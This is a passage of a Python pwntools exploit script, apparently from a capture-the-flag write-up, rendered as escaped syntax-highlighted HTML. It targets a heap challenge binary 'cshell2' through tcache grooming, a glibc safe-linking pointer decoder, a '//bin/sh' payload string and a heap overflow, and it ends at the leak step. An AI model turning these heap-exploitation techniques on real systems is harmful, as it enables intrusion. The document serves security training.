exe &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cshell2&amp;#39;&lt;/span&gt;)
libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;)

pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;delete_corefiles &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rename_corefiles &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;timeout &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt;

host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;HOST &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PORT &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;)


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;local&lt;/span&gt;(argv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;Execute the target binary locally&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;debug([exe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; argv, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gdbscript, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process([exe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; argv, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;remote&lt;/span&gt;(argv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;Connect to the process on the remote host&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GDB:
        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(io, gdbscript&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gdbscript)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; io


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start&lt;/span&gt;(argv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;Start the exploit against the target.&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;args&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;LOCAL:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; local(argv, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; remote(argv, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kw)


gdbscript &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;continue
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;locals())

io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;


io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start()

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(idx, size, firstname, midname, lastname, age, bio, l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5 re-age user&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter size (1032 minimum): &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, str(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; l:
        io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input firstname: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, firstname)
        io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input middlename: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, midname)
        io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input lastname: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, lastname)
        io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input age: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, str(age)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
        io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input bio: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, bio)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input firstname: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, firstname)
        io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input middlename: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, midname)
        io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input lastname: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, lastname)
        io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input age: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, str(age)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
        io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input bio: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, bio)



&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;(idx):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5 re-age user&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;(idx):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5 re-age user&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;edit&lt;/span&gt;(idx, firstname, midname, lastname, age, bio):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5 re-age user&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
    
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input firstname: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, firstname)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input middlename: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, midname)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input lastname: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, lastname)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input age: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, str(age)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, bio)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt_pointer&lt;/span&gt;(leak: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
    parts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

    parts&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append((leak &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;)
    parts&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append((((leak &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFF&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (parts[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;)
    parts&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append((((leak &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFF&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((parts[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFF&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; parts[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; parts[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; parts[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]

add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;//bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
    add(i, &lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
    delete(i)

delete(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Y&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;))

show(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
